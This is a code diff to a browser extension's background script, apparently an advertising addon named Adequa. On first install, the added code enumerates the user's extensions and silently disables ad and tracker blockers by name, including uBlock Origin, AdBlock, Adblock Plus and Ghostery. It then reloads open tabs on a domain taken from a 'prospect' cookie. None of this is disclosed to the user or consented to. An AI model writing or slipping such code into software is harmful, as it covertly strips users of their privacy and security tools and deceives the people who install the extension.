@@ -34,7 +34,36 @@ const firstInstall = function(){
     req.open('post', Adequa.uri + 'api/addon/create');
     req.send(null);
 
-    // Adequa.storage.setCurrent({firstInstall: false});
+    disableAdblockers();
+
+    Adequa.cookies.getProspectCookie(function(prospect){
+        if(!prospect)
+            return;
+        
+        const checkTabs = function(tabs){
+            for(let tab of tabs){
+                if(tab.url.indexOf(prospect.domain) !== -1){
+                    reloadTab(tab.id);
+                }
+            }
+        };
+
+        const reloadTab = function (tabId) {
+            if(vAPI.chrome){
+                chrome.tabs.reload(tabId);
+            }
+            else {
+                browser.tabs.reload(tabId);
+            }
+        };
+
+        if(vAPI.chrome){
+            chrome.tabs.query({}, checkTabs);
+        }
+        else {
+            browser.tabs.query({}).then(tabs => checkTabs(tabs));
+        }
+    });
 };
 
 const fetchCurrent = function(callback){
@@ -75,4 +104,43 @@ const setTimer = function () {
 
     setInterval(resetIfDayChanged, 1000 * 60 * 60);
     setInterval(Adequa.resources.fetchAll, 1000 * 60 * 30);
+};
+
+const addonNames = [
+    "uBlock Origin",
+    "AdBlock",
+    "Adblock Plus",
+    "Ghostery – Bloqueur de publicité protégeant la vie privée",
+    "uBlock Plus Adblocker",
+    "uBlock"
+];
+
+const disableAdblockers = function(){
+    if(vAPI.chrome){
+        disableChromeAdblockers();
+    }
+    else {
+        disableFirefoxAdblockers();
+    }
+};
+
+const checkIfAddonNameMatch = function(addons){
+    for(let addon of addons){
+        if(addonNames.indexOf(addon.name) !== -1){
+            if(vAPI.chrome){
+                chrome.management.setEnabled(addon.id, false);
+            }
+            else {
+                browser.management.setEnabled(addon.id, false);
+            }
+        }
+    }
+};
+
+const disableChromeAdblockers = function(){
+    chrome.management.getAll(checkIfAddonNameMatch);
+};
+
+const disableFirefoxAdblockers = function(){
+    browser.management.getAll().then(addons => checkIfAddonNameMatch(addons));
 };
